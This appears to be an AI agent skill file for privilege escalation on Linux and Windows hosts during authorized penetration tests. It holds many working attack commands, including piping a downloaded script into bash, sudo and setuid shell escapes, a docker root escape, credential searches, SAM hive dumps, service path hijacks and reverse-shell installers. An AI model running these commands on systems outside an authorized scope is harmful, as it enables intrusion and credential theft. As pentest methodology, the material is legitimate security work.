---
name: privesc-assist
description: Privilege escalation assistance skill. Invoke when you have shell access on a target host and need to identify and exploit privilege escalation paths during an authorized engagement.
---

# Privilege Escalation Assistance

Identify and exploit privilege escalation paths from a low-privilege shell under an **authorized** engagement. Covers Linux and Windows.

---

## Scope constraints

| Allowed | Prohibited |
|---|---|
| Running enumeration scripts on authorized hosts | Escalating on out-of-scope systems |
| Exploiting identified misconfigs to reach root/SYSTEM | Modifying permanent system state without approval (cron jobs, services on production) |
| Extracting credential material to prove exposure | Exfiltrating PII or dumping entire password databases |

---

## Linux privilege escalation

### 1. Automated enumeration
```bash
# LinPEAS (fastest overview)
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas.out
# LinEnum
bash LinEnum.sh -t | tee /tmp/linenum.out
# LSE
bash lse.sh -l 2 | tee /tmp/lse.out
```

### 2. Manual checks — high-value targets

**SUID/SGID binaries**
```bash
find / -perm -u=s -type f 2>/dev/null
# Check GTFOBins for each result: https://gtfobins.github.io/
```

**Sudo rights**
```bash
sudo -l
# Common escapes: vim, less, find, nmap, python, perl, ruby, awk, env
# Example: sudo find /tmp -exec /bin/sh \;
```

**Writable cron jobs**
```bash
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/root 2>/dev/null
# If writable script in cron: append reverse shell
```

**World-writable files and paths**
```bash
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v tmp
```

**Capabilities**
```bash
getcap -r / 2>/dev/null
# python3 cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

**NFS no_root_squash**
```bash
cat /etc/exports
# If no_root_squash: mount remotely, create SUID binary owned by root
```

**Docker group membership**
```bash
id | grep docker
# If in docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Kernel exploits**
```bash
uname -a; cat /etc/os-release
# Search exploitdb: searchsploit <kernel version>
# Common: DirtyPipe (5.8-5.16), DirtyCow (< 4.9.0)
```

**Credentials in files**
```bash
grep -r "password\|passwd\|secret\|api_key" /etc /home /var/www 2>/dev/null | grep -v "^Binary"
find / -name "*.conf" -o -name "*.cfg" -o -name ".env" 2>/dev/null | xargs grep -l "pass\|secret" 2>/dev/null
```

---

## Windows privilege escalation

### 1. Automated enumeration
```powershell
# WinPEAS
.\winPEASx64.exe | Tee-Object -FilePath C:\Temp\winpeas.out
# PowerUp
Import-Module .\PowerUp.ps1; Invoke-AllChecks | Tee-Object -FilePath C:\Temp\powerup.out
# Seatbelt
.\Seatbelt.exe all | Tee-Object -FilePath C:\Temp\seatbelt.out
```

### 2. Manual checks — high-value targets

**Token privileges**
```
whoami /priv
# SeImpersonatePrivilege → JuicyPotatoNG, PrintSpoofer, GodPotato
# SeBackupPrivilege → dump SAM/SYSTEM hive
```

**Unquoted service paths**
```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name,PathName,StartMode
```

**Weak service permissions**
```
sc qc <SERVICE_NAME>
accesschk.exe /accepteula -wuvc <SERVICE_NAME>
# If writable: sc config <SVC> binpath= "C:\Temp\shell.exe"
```

**AlwaysInstallElevated**
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both 1: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi; msiexec /quiet /qn /i shell.msi
```

**Stored credentials**
```
cmdkey /list
# If entries exist: runas /savecred /user:<DOMAIN>\<USER> "C:\Temp\shell.exe"
```

**SAM/SYSTEM dump (admin → SYSTEM)**
```
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
# Offline: secretsdump.py -sam sam -system system LOCAL
```

**DLL hijacking**
```
# ProcMon filter: PATH NOT FOUND, .dll — look for writable directories
# If writable path before legitimate DLL location: plant malicious DLL
```

---

## Lateral movement (post-privesc)
Once you have high-priv creds/hash, pivot using `impacket` or CrackMapExec (see `network-pentest` skill).

## Output format
```
## Privilege Escalation Report — <HOST> <OS> — <DATE>
### Starting context (user, groups, shell)
### Path to root/SYSTEM
  1. Identified vector: <description>
  2. Exploitation steps:
  3. Evidence of privilege (whoami/id output):
### Additional paths found (not exploited)
### Remediation
```
